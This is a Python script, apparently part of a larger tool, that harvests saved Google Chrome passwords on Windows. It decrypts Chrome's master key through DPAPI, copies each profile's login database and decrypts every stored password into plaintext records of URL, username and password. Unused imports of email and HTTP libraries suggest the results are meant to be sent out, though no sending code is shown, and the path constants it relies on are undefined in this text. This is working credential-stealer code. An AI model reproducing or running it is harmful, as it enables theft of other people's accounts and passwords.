import os
import re
import json
import base64
import sqlite3
import win32crypt
from Cryptodome.Cipher import AES
import shutil
import subprocess
import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from colorama import init, Fore, Style
import tempfile
import requests
# aca empieza el codigo para almacenar las de chrome
def get_secret_key():
    try:
        with open(CHROME_PATH_LOCAL_STATE, "r", encoding='utf-8') as f:
            local_state = json.loads(f.read())
        secret_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
        secret_key = secret_key[5:]  # Remove DPAPI prefix
        secret_key = win32crypt.CryptUnprotectData(secret_key, None, None, None, 0)[1]
        return secret_key
    except Exception as e:
        return f"[ERR] Chrome secret key cannot be found: {e}"
 
def decrypt_payload(cipher, payload):
    return cipher.decrypt(payload)
 
def generate_cipher(aes_key, iv):
    return AES.new(aes_key, AES.MODE_GCM, iv)
 
def decrypt_password(ciphertext, secret_key):
    try:
        initialisation_vector = ciphertext[3:15]
        encrypted_password = ciphertext[15:-16]
        cipher = generate_cipher(secret_key, initialisation_vector)
        decrypted_pass = decrypt_payload(cipher, encrypted_password).decode()
        return decrypted_pass
    except Exception as e:
        return f"[ERR] Unable to decrypt password: {e}"
 
def get_db_connection(chrome_path_login_db):
    try:
        shutil.copy2(chrome_path_login_db, "Loginvault.db")
        return sqlite3.connect("Loginvault.db")
    except Exception as e:
        return f"[ERR] Chrome database cannot be found: {e}"
 
def procesar_chrome():
    output = []  # Variable para almacenar el resultado final
    try:
        secret_key = get_secret_key()
        if isinstance(secret_key, str) and secret_key.startswith("[ERR]"):
            output.append(secret_key)
            return output
 
        folders = [element for element in os.listdir(CHROME_PATH) if re.search("^Profile*|^Default$", element)]
        for folder in folders:
            chrome_path_login_db = os.path.normpath(r"%s\%s\Login Data" % (CHROME_PATH, folder))
            conn = get_db_connection(chrome_path_login_db)
            if isinstance(conn, str) and conn.startswith("[ERR]"):
                output.append(conn)
                continue
 
            if secret_key and conn:
                cursor = conn.cursor()
                cursor.execute("SELECT action_url, username_value, password_value FROM logins")
                for index, login in enumerate(cursor.fetchall()):
                    url = login[0]
                    username = login[1]
                    ciphertext = login[2]
                    if url and username and ciphertext:
                        decrypted_password = decrypt_password(ciphertext, secret_key)
                        result = f"Sequence: {index}\nURL: {url}\nUser Name: {username}\nPassword: {decrypted_password}\n{'*' * 50}"
                        output.append(result)
                cursor.close()
                conn.close()
                os.remove("Loginvault.db")
    except Exception as e:
        output.append(f"[ERR] {e}")
    return output
# aca termina el codigo para almacenar las de chrome
